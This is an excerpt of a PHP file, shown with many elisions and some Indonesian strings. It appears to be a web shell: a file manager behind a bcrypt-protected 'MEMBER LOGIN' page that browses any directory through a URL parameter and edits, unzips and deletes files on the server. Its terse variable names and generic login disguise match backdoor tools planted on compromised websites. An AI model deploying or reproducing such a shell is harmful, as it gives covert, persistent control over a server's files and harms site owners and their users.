...
$password_hash = '$2a$12$dzqh9N6/xfqPYCPV1et2QOfZXKEolX4E4Wm1.Mt.R4bZL.lzThstm'; 
...
// Login check menggunakan Username dan Bcrypt Password
if (!isset($_SESSION['l'])) {
    if (isset($_POST['u']) && isset($_POST['p'])) {
        if ($_POST['u'] === $username && password_verify($_POST['p'], $password_hash)) {
            $_SESSION['l'] = true;
        } else {
    ...
    if (!isset($_SESSION['l'])) {
        ...
        <head>
            ...
            <style>
                body { background-color: #f2f2f2; font-family: "Roboto", sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #5c5c5c; }
                form { display: flex; flex-direction: column; align-items: center; width: 100%; }
                input { padding: 12px 0; margin-bottom: 10px; border-radius: 3px; border: none; text-align: center; width: 100%; font-size: 16px; background-color: #f9f9f9; box-shadow: inset 2px 2px 5px rgba(0,0,0,0.05); }
                input:focus { outline: none; box-shadow: inset 2px 2px 8px rgba(0,0,0,0.1); }
                input[type="submit"] { background: #3498DB; cursor: pointer; color: white; margin: 10px 0; letter-spacing: 1px; font-size: 13px; font-weight: bold; width: 100%; transition: 0.3s; }
                input[type="submit"]:hover { background: #2980b9; box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3); }
                a:link, a:visited { font-size: 12px; color: #777; text-decoration: none; }
                .login-box { padding: 40px; background-color: #f2f2f2; border-radius: 5px; display: flex; flex-direction: column; align-items: center; box-shadow: 12px 12px 40px 0 rgba(0, 0, 0, 0.09), -10px -10px 30px 0 rgba(255, 255, 255, 0.9); width: 300px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h3 style="letter-spacing: 3px; margin-bottom: 25px;">MEMBER LOGIN</h3>
                '.(isset($error) ? '<p style="color:red; font-size:12px;">'.$error.'</p>' : '').'
                <form method="POST">
...
<head>
    ...
    <style>
        ...
        .logout-btn { background: #c0392b; color: white; padding: 5px 10px; border-radius: 3px; border: none; }
...
<div class="nav-header">
    <div>
        ...
        foreach($parts as $p) {
            ...
            echo "<a href='?d=".urlencode($path_build)."'>$p</a> / ";
        }
        ?>
    </div>
    <div>
        <a href="?logout=true" class="logout-btn" onclick="return confirm('Logout?')">Logout</a>
    </div>
</div>
...
<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    ...
    <form method="post" style="align-items: flex-start;">
        ...
        <div>
            ...
            <a href="?d=<?= urlencode($dir) ?>" style="color:red;margin-left:10px; font-size: 14px;">Cancel</a>
        </div>
    </form>
</div>
<?php endif; ?>
    ...
    foreach($sorted_items as $i) {
        ...
        <tr>
            ...
            <td style="padding-left: 5px;">
                <?php if($is_d): ?>
                    📁 <a href="?d=<?= urlencode($full) ?>" style="color:yellow"><?= $i ?></a>
                <?php else: ?>
                    📄 <a href="?d=<?= urlencode($dir) ?>&edit=<?= urlencode($full) ?>" style="color:white"><?= $i ?></a>
                <?php endif; ?>
            </td>
            ...
            <td align="center">
                <div style="display: flex; justify-content: center; align-items: center; gap: 5px;">
                    ...
                    |
                    <?php 
                    if(!$is_d) echo '<a href="?d='.urlencode($dir).'&edit='.urlencode($full).'" style="color:lime; font-size: 11px;">Edit</a> | ';
                    if(strtolower(pathinfo($i, PATHINFO_EXTENSION)) == 'zip') echo '<a href="?d='.urlencode($dir).'&unzip='.urlencode($i).'" style="color:orange; font-size: 11px;">Unzip</a> | ';
                    ?>
                    <a href="?d=<?= urlencode($dir) ?>&del=<?= urlencode($i) ?>" style="color:red; font-size: 11px;" onclick="return confirm('Hapus?')">Del</a>
                </div>
            </td>
        </tr>
        <?php
